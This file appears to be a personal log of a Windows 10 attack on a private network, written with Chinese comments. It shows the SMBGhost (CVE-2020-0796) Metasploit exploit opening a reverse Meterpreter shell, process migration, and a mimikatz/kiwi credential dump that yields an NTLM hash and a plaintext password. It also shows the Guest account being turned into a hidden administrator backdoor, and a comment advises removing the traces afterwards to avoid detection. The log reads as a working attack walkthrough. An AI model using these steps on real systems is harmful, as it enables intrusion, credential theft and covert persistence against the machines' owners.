+Microsoft Windows [�汾 10.0.18362.476]
+(c) 2019 Microsoft Corporation����������Ȩ����
+
+C:\Windows\system32>chcp 65001
+chcp 65001
+Active code page: 65001
+
+C:\Windows\system32>shutdown -r -f
+shutdown -r -f
+Access is denied.(5)
+
+C:\Windows\system32>exit
+exit
+meterpreter > ps -S explorer
+Filtering on 'explorer'
+
+Process List
+============
+
+ PID   PPID  Name        Arch  Session  User              Path
+ ---   ----  ----        ----  -------  ----              ----
+ 4808  4732  explorer.e  x64   1        DESKTOP-ASI6V22\  C:\Windows\explor
+             xe                         tyza66            er.exe
+
+meterpreter > migrate 4808
+[*] Migrating from 2224 to 4808...
+[*] Migration completed successfully.
+meterpreter > shell
+Process 1868 created.
+Channel 1 created.
+Microsoft Windows [�汾 10.0.18362.476]
+(c) 2019 Microsoft Corporation����������Ȩ����
+
+C:\Windows\system32>chcp 65001
+chcp 65001
+Active code page: 65001
+
+C:\Windows\system32>shutdown -r -f -t 0
+shutdown -r -f
+
+立刻重启就是shutdown -r -f -t 0
+meterpreter > ps -S explorer
+Filtering on 'explorer'
+
+Process List
+============
+
+ PID   PPID  Name        Arch  Session  User              Path
+ ---   ----  ----        ----  -------  ----              ----
+ 4588  4480  explorer.e  x64   1        DESKTOP-ASI6V22\  C:\Windows\explor
+             xe                         tyza66            er.exe
+
+meterpreter > migrate 4588
+[*] Migrating from 2416 to 4588...
+[*] Migration completed successfully.
+meterpreter > shel
+[-] Unknown command: shel. Did you mean shell? Run the help command for more details.
+meterpreter > shell
+Process 512 created.
+Channel 1 created.
+Microsoft Windows [�汾 10.0.18362.476]
+(c) 2019 Microsoft Corporation����������Ȩ����
+
+C:\Windows\system32>shutdown -r -f -t 0
+shutdown -r -f -t 0
+
+之后就可以直接获得明文密码了
+msf6 exploit(windows/smb/cve_2020_0796_smbghost) > run
+
+[*] Started reverse TCP handler on 192.168.101.53:4444 
+[*] 192.168.101.111:445 - Running automatic check ("set AutoCheck false" to disable)
+[!] 192.168.101.111:445 - The service is running, but could not be validated.
+[*] 192.168.101.111:445 - Found low stub at physical address 0x0000000000014000, virtual address 0xfffff7d40000f000
+[*] 192.168.101.111:445 - Found PML4 at 0x00000000001ad000 (UEFI)
+[*] 192.168.101.111:445 - Found HAL heap at 0xfffff7d400000000
+[*] 192.168.101.111:445 - Found PML4 self-reference entry at 0x01b8
+[*] 192.168.101.111:445 - Found hal!HalpInterruptController at 0xfffff7d400001490
+[*] 192.168.101.111:445 - Found hal!HalpApicRequestInterrupt at 0xfffff80753b5ebb0
+[*] 192.168.101.111:445 - KUSER_SHARED_DATA PTE NX bit cleared!
+[*] Sending stage (201798 bytes) to 192.168.101.111
+[*] Meterpreter session 8 opened (192.168.101.53:4444 -> 192.168.101.111:49674) at 2025-02-17 10:44:37 +0800
+[*] 192.168.101.111:445 - Restoring the KUSER_SHARED_DATA PTE NX bit...
+
+meterpreter > load kiwi
+Loading extension kiwi...
+  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
+  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
+
+Success.
+meterpreter > creds_all
+[+] Running as SYSTEM
+[*] Retrieving all credentials
+msv credentials
+===============
+
+Username  Domain           NTLM                     SHA1
+--------  ------           ----                     ----
+tyza66    DESKTOP-ASI6V22  32ed87bdb5fdc5e9cba8854  6ed5833cf35286ebf8662b7
+                           7376818d4                b5949f0d742bbec3f
+
+wdigest credentials
+===================
+
+Username          Domain           Password
+--------          ------           --------
+(null)            (null)           (null)
+DESKTOP-ASI6V22$  WORKGROUP        (null)
+tyza66            DESKTOP-ASI6V22  123456
+
+kerberos credentials
+====================
+
+Username          Domain           Password
+--------          ------           --------
+(null)            (null)           (null)
+desktop-asi6v22$  WORKGROUP        (null)
+tyza66            DESKTOP-ASI6V22  (null)
+
+
+
+除此之外还有另外一套方案 利用windows中的guest账号 这个是默认禁用的 我们可以启用它并设置密码并加入管理员组 之后就可以利用了
+msf6 exploit(windows/smb/cve_2020_0796_smbghost) > run
+
+[*] Started reverse TCP handler on 192.168.101.53:4444 
+[*] 192.168.101.111:445 - Running automatic check ("set AutoCheck false" to disable)
+[!] 192.168.101.111:445 - The service is running, but could not be validated.
+[*] 192.168.101.111:445 - Found low stub at physical address 0x0000000000014000, virtual address 0xfffff7b5c000f000
+[*] 192.168.101.111:445 - Found PML4 at 0x00000000001ad000 (UEFI)
+[*] 192.168.101.111:445 - Found HAL heap at 0xfffff7b5c0000000
+[*] 192.168.101.111:445 - Found PML4 self-reference entry at 0x01f1
+[*] 192.168.101.111:445 - Found hal!HalpInterruptController at 0xfffff7b5c0001490
+[*] 192.168.101.111:445 - Found hal!HalpApicRequestInterrupt at 0xfffff8006eb5ebb0
+[*] 192.168.101.111:445 - KUSER_SHARED_DATA PTE NX bit cleared!
+[*] Sending stage (201798 bytes) to 192.168.101.111
+[*] Meterpreter session 9 opened (192.168.101.53:4444 -> 192.168.101.111:49678) at 2025-02-17 10:48:41 +0800
+[*] 192.168.101.111:445 - Restoring the KUSER_SHARED_DATA PTE NX bit...
+
+meterpreter > shell
+Process 416 created.
+Channel 1 created.
+Microsoft Windows [�汾 10.0.18362.476]
+(c) 2019 Microsoft Corporation����������Ȩ����
+
+C:\Windows\system32>chcp 65001
+chcp 65001
+Active code page: 65001
+
+C:\Windows\system32>net user
+net user
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+admin                    Administrator            DefaultAccount           
+Guest                    tyza66                   WDAGUtilityAccount       
+The command completed with one or more errors.
+
+
+C:\Windows\system32>net user Guest
+net user Guest
+User name                    Guest
+Full Name                    
+Comment                      ���������ʼ��������������������ʻ�
+User's comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            ?2025/?2/?17 10:49:53
+Password expires             Never
+Password changeable          ?2025/?2/?17 10:49:53
+Password required            No
+User may change password     No
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   ?2025/?2/?17 9:32:26
+
+Logon hours allowed          All
+
+Local Group Memberships      *Guests               
+Global Group memberships     *None                 
+The command completed successfully.
+
+
+C:\Windows\system32>net user Guest /active:yes
+net user Guest /active:yes
+The command completed successfully.
+
+
+C:\Windows\system32>net user Guest 123456
+net user Guest 123456
+The command completed successfully.
+
+
+C:\Windows\system32>net localgroup Administrators Goest /add
+net localgroup Administrators Goest /add
+There is no such global user or group: Goest.
+
+More help is available by typing NET HELPMSG 3783.
+
+
+C:\Windows\system32>net localgroup Administrators Guest /add
+net localgroup Administrators Guest /add
+The command completed successfully.
+
+
+C:\Windows\system32>net user Guest
+net user Guest
+User name                    Guest
+Full Name                    
+Comment                      ���������ʼ��������������������ʻ�
+User's comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            ?2025/?2/?17 10:50:50
+Password expires             Never
+Password changeable          ?2025/?2/?17 10:50:50
+Password required            No
+User may change password     No
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   ?2025/?2/?17 9:32:26
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators       *Guests               
+Global Group memberships     *None                 
+The command completed successfully.
+
+
+C:\Windows\system32>
+
+
+但是记得用完之后要给清除掉 以免被发现
+
+C:\Windows\system32>net user Guest ""   
+net user Guest ""
+The command completed successfully.
+
+
+C:\Windows\system32>net localgroup Administrators Guest /del
+net localgroup Administrators Guest /del
+The command completed successfully.
+
+
+C:\Windows\system32>net user Guide
+net user Guide
+The user name could not be found.
+
+More help is available by typing NET HELPMSG 2221.
+
+
+C:\Windows\system32>net user Guest
+net user Guest
+User name                    Guest
+Full Name                    
+Comment                      ���������ʼ��������������������ʻ�
+User's comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            ?2025/?2/?17 10:54:30
+Password expires             Never
+Password changeable          ?2025/?2/?17 10:54:30
+Password required            No
+User may change password     No
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   ?2025/?2/?17 9:32:26
+
+Logon hours allowed          All
+
+Local Group Memberships      *Guests               
+Global Group memberships     *None                 
+The command completed successfully.
+
+C:\Windows\system32>net user Guest /active:no
+net user Guest /active:no
+The command completed successfully.
+
+接下来用smf的smb_enumshares模块基于SMB协议扫描共享文件(账号:密码)
+
+
+
+
+
+
+
+
+
